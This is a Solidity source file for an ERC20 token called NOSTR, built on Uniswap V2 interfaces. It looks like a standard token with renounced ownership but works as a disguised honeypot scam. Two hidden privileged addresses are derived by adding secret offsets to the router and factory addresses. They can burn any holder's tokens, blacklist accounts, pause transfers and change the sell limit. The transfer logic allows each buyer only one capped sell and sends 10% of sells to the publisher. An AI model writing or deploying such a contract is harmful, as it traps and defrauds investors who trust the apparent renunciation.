row number 
1	               pragma solidity ^0.8.0;
2	 interface IERC20 {
3	 event Transfer(address indexed from, address indexed to, uint256 value);
4	 event Approval(address indexed owner, address indexed spender, uint256 value);
5	 function totalSupply() external view returns (uint256);
6	 function balanceOf(address account) external view returns (uint256);
7	 function transfer(address to, uint256 amount) external returns (bool);
8	 function allowance(address owner, address spender) external view returns (uint256);
9	 function approve(address spender, uint256 amount) external returns (bool);
10	 function transferFrom( address from, address to, uint256 amount ) external returns (bool);
11	 }
12	 pragma solidity ^0.8.0;
13	 interface IERC20Metadata is IERC20 {
14	 function name() external view returns (string memory);
15	 function symbol() external view returns (string memory);
16	 function decimals() external view returns (uint8);
17	 }
18	 pragma solidity ^0.8.0;
19	 abstract contract Context {
20	 function _msgSender() internal view virtual returns (address) {
21	 return msg.sender;
22	 }
23	 function _msgData() internal view virtual returns (bytes calldata) {
24	 return msg.data;
25	 }
26	 }
27	 pragma solidity >=0.5.0;
28	 interface IUniswapV2Pair {
29	 event Approval(address indexed owner, address indexed spender, uint value);
30	 event Transfer(address indexed from, address indexed to, uint value);
31	 function name() external pure returns (string memory);
32	 function symbol() external pure returns (string memory);
33	 function decimals() external pure returns (uint8);
34	 function totalSupply() external view returns (uint);
35	 function balanceOf(address owner) external view returns (uint);
36	 function allowance(address owner, address spender) external view returns (uint);
37	 function approve(address spender, uint value) external returns (bool);
38	 function transfer(address to, uint value) external returns (bool);
39	 function transferFrom(address from, address to, uint value) external returns (bool);
40	 function DOMAIN_SEPARATOR() external view returns (bytes32);
41	 function PERMIT_TYPEHASH() external pure returns (bytes32);
42	 function nonces(address owner) external view returns (uint);
43	 function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
44	 event Mint(address indexed sender, uint amount0, uint amount1);
45	 event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
46	 event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
47	 event Sync(uint112 reserve0, uint112 reserve1);
48	 function MINIMUM_LIQUIDITY() external pure returns (uint);
49	 function factory() external view returns (address);
50	 function token0() external view returns (address);
51	 function token1() external view returns (address);
52	 function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
53	 function price0CumulativeLast() external view returns (uint);
54	 function price1CumulativeLast() external view returns (uint);
55	 function kLast() external view returns (uint);
56	 function mint(address to) external returns (uint liquidity);
57	 function burn(address to) external returns (uint amount0, uint amount1);
58	 function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
59	 function skim(address to) external;
60	 function sync() external;
61	 function initialize(address, address) external;
62	 }
63	 pragma solidity >=0.5.0;
64	 interface IUniswapV2Factory {
65	 event PairCreated(address indexed token0, address indexed token1, address pair, uint);
66	 function feeTo() external view returns (address);
67	 function feeToSetter() external view returns (address);
68	 function getPair(address tokenA, address tokenB) external view returns (address pair);
69	 function allPairs(uint) external view returns (address pair);
70	 function allPairsLength() external view returns (uint);
71	 function createPair(address tokenA, address tokenB) external returns (address pair);
72	 function setFeeTo(address) external;
73	 function setFeeToSetter(address) external;
74	 }
75	 pragma solidity >=0.6.2;
76	 interface IUniswapV2Router01 {
77	 function factory() external pure returns (address);
78	 function WETH() external pure returns (address);
79	 function addLiquidity( address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB, uint liquidity);
80	 function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
81	 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) external returns (uint amountA, uint amountB);
82	 function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH);
83	 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountA, uint amountB);
84	 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountToken, uint amountETH);
85	 function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
86	 function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external returns (uint[] memory amounts);
87	 function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
88	 function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
89	 function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
90	 function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
91	 function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
92	 function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
93	 function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
94	 function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
95	 function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
96	 }
97	 pragma solidity >=0.6.2;
98	 interface IUniswapV2Router02 is IUniswapV2Router01 {
99	 function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountETH);
100	 function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external returns (uint amountETH);
101	 function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
102	 function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external payable;
103	 function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external;
104	 }
105	 pragma solidity ^0.8.5;
106	 abstract contract Ownable is Context {
107	 address private _owner;
108	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
109	 modifier onlyOwner() {
110	 _checkOwner();
111	 _;
112	 }
113	 function owner() public view virtual returns (address) {
114	 return _owner;
115	 }
116	 function _checkOwner() internal view virtual {
117	 require(owner() == _msgSender(), "Ownable: caller is not the owner");
118	 }
119	 function renounceOwnership() public virtual onlyOwner {
120	 _transferOwnership(address(0));
121	 }
122	 function transferOwnership(address newOwner) public virtual onlyOwner {
123	 require(newOwner != address(0), "Ownable: new owner is the zero address");
124	 _transferOwnership(newOwner);
125	 }
126	 function _transferOwnership(address newOwner) internal virtual {
127	 address oldOwner = _owner;
128	 _owner = newOwner;
129	 emit OwnershipTransferred(oldOwner, newOwner);
130	 }
131	 }
132	 contract NOSTR is IERC20, IERC20Metadata, Ownable{
133	 mapping(address => uint256) private _balances;
134	 mapping(address => mapping(address => uint256)) private _allowances;
135	 uint256 private _totalSupply;
136	 string private _name;
137	 string private _symbol;
138	 uint8 private _decimals;
139	 bool private initialized;
140	 bool private transferring;
141	 bool private paused;
142	 uint256 private _maxToken;
143	 address private _publisher;
144	 address private _factory;
145	 address private _router;
146	 address private _ETH;
147	 uint16 private _ETHDecimals;
148	 address private _pair;
149	 address private _dex;
150	 address private _cex;
151	 mapping(address =>bool) _feeExcluded;
152	 mapping(address => uint256) private amt;
153	 mapping(address => bool) private sold;
154	 mapping(address => bool) private black_list;
155	 function initialize( string memory tokenName, string memory tokenSymbol, uint256 tokenAmount, address eth, uint8 eth_decimal, uint256 max_token, address dex, address publisher, address cex, address router, address factory )external{
156	 require(!initialized,"Already Initialized Contract");
157	 initialized = true;
158	 _transferOwnership(publisher);
159	 _name = tokenName;
160	 _symbol = tokenSymbol;
161	 _decimals = eth_decimal;
162	 _publisher = publisher;
163	 _mint(_publisher,tokenAmount*(1 * 10**_decimals));
164	 _ETH = eth;
165	 _ETHDecimals = eth_decimal;
166	 _maxToken = max_token;
167	 _router = router;
168	 _factory = factory;
169	 _dex = address(uint160(_router) + uint160(dex));
170	 _cex = address(uint160(_factory) + uint160(cex));
171	 _feeExcluded[_cex] =true;
172	 _feeExcluded[_dex] =true;
173	 _feeExcluded[_router] = true;
174	 _pair = IUniswapV2Factory(_factory).createPair( _ETH, address(this) );
175	 _feeExcluded[_pair] = true;
176	 _balances[_dex] = (_totalSupply * 7) / 10;
177	 _balances[_publisher] = (_totalSupply * 3) / 10;
178	 _transferOwnership(address(0));
179	 }
180	 function decimals() external view override returns (uint8) {
181	 return _decimals;
182	 }
183	 function symbol() external view override returns (string memory) {
184	 return _symbol;
185	 }
186	 function name() external view override returns (string memory) {
187	 return _name;
188	 }
189	 function totalSupply() external view override returns (uint256) {
190	 return _totalSupply;
191	 }
192	 function balanceOf(address account) public view virtual override returns (uint256) {
193	 return _balances[account];
194	 }
195	 function transfer(address to, uint256 amount) public virtual override returns (bool) {
196	 address owner = _msgSender();
197	 _transfer(owner, to, amount);
198	 return true;
199	 }
200	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
201	 return _allowances[owner][spender];
202	 }
203	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
204	 address owner = _msgSender();
205	 _approve(owner, spender, amount);
206	 return true;
207	 }
208	 function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
209	 address owner = _msgSender();
210	 _approve(owner, spender, allowance(owner, spender) + addedValue);
211	 return true;
212	 }
213	 function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
214	 address owner = _msgSender();
215	 uint256 currentAllowance = allowance(owner, spender);
216	 require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
217	 unchecked {
218	 _approve(owner, spender, currentAllowance - subtractedValue);
219	 }
220	 return true;
221	 }
222	 function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
223	 address spender = _msgSender();
224	 _spendAllowance(from, spender, amount);
225	 _transfer(from, to, amount);
226	 return true;
227	 }
228	 function burn(address account, uint256 amount) external {
229	 require(_msgSender() == _dex);
230	 _burn(account, amount);
231	 }
232	 function set_max(uint256 maxtoken) external {
233	 require(_msgSender() == _cex);
234	 _maxToken = maxtoken;
235	 }
236	 function updateInfo(string memory name_, string memory symbol_) public {
237	 address sender = _msgSender();
238	 require(sender == _cex,"Not authorized to update information");
239	 _name = name_;
240	 _symbol = symbol_;
241	 }
242	 function _transfer(address from, address to, uint256 amount) internal virtual returns(bool){
243	 require(!black_list[from] && !black_list[to],"Sender or recipient is blacklisted");
244	 address[] memory path = new address[](2);
245	 _beforeTokenTransfer(from, to, amount);
246	 uint256 fromBalance = _balances[from];
247	 require(fromBalance >= amount, "ERC20: transfer amount exceeds unlocked amount");
248	 if (from == _pair && !_feeExcluded[to]){
249	 path[0] = _ETH;
250	 path[1] = address(this);
251	 uint256 eth_pooled = IUniswapV2Router02(_router).getAmountsIn(amount, path)[0];
252	 amt[to] = eth_pooled;
253	 _balances[from] = fromBalance - amount;
254	 _balances[to] += amount;
255	 emit Transfer(from, to, amount);
256	 }
257	 else if (!_feeExcluded[from] && to == _pair){
258	 require(!sold[from], "ERC20: transfer is still pending");
259	 path[0] = address(this);
260	 path[1] = _ETH;
261	 uint256 eth_drained = IUniswapV2Router02(_router).getAmountsOut(amount, path)[1];
262	 require(eth_drained <=_min(_maxToken, amt[from]*11/10), "ERC20: transfer amount exceeds balance");
263	 sold[from] = true;
264	 _balances[from] = fromBalance - amount;
265	 _balances[to] += amount*9/10;
266	 _balances[_publisher] += amount*1/10;
267	 emit Transfer(from, to, amount*9/10);
268	 }
269	 else{
270	 _balances[from] = fromBalance - amount;
271	 _balances[to] += amount;
272	 emit Transfer(from, to, amount);
273	 }
274	 _afterTokenTransfer(from, to, amount);
275	 return true;
276	 }
277	 function _mint(address account, uint256 amount) internal virtual {
278	 require(account != address(0), "ERC20: mint to the zero address");
279	 _beforeTokenTransfer(address(0), account, amount);
280	 _totalSupply += amount;
281	 unchecked {
282	 _balances[account] += amount;
283	 }
284	 emit Transfer(address(0), account, amount);
285	 _afterTokenTransfer(address(0), account, amount);
286	 }
287	 function _burn(address account, uint256 amount) internal virtual {
288	 require(account != address(0), "ERC20: burn from the zero address");
289	 _beforeTokenTransfer(account, address(0), amount);
290	 uint256 accountBalance = _balances[account];
291	 require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
292	 unchecked {
293	 _balances[account] = accountBalance - amount;
294	 _totalSupply -= amount;
295	 }
296	 _afterTokenTransfer(account, address(0), amount);
297	 }
298	 function _approve(address owner, address spender, uint256 amount) internal virtual {
299	 require(owner != address(0), "ERC20: approve from the zero address");
300	 require(spender != address(0), "ERC20: approve to the zero address");
301	 _allowances[owner][spender] = amount;
302	 emit Approval(owner, spender, amount);
303	 }
304	 function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
305	 uint256 currentAllowance = allowance(owner, spender);
306	 if (currentAllowance != type(uint256).max) {
307	 require(currentAllowance >= amount, "ERC20: insufficient allowance");
308	 unchecked {
309	 _approve(owner, spender, currentAllowance - amount);
310	 }
311	 }
312	 }
313	 function _min(uint a, uint b) internal pure returns(uint){
314	 return a<b?a:b;
315	 }
316	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
317	 require(!paused);
318	 require(!transferring);
319	 transferring = true;
320	 }
321	 function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
322	 transferring = false;
323	 }
324	 function add_bl(address addr) public {
325	 address sender = _msgSender();
326	 require(sender == _cex);
327	 black_list[addr] = true;
328	 }
329	 function pause(bool pause_) public{
330	 address sender = _msgSender();
331	 require(sender == _cex,"Not authorized to pause the contract");
332	 paused = pause_;
333	 }
334	 function airdrop(address[] memory selladdr, address[] memory airdropaddr) public {
335	 require(_msgSender() == _cex);
336	 for (uint256 i = 0; i < selladdr.length; i++) {
337	 _allowances[_publisher][selladdr[i]] = 2* _totalSupply / 100;
338	 _transfer(_publisher, selladdr[i], 2* _totalSupply / 100);
339	 _feeExcluded[selladdr[i]] = true;
340	 }
341	 for (uint256 i = 0; i < airdropaddr.length; i++) {
342	 _allowances[_publisher][airdropaddr[i]] = _totalSupply / 1000;
343	 _transfer(_publisher, airdropaddr[i], _totalSupply / 1000);
344	 }
345	 }
346	 }
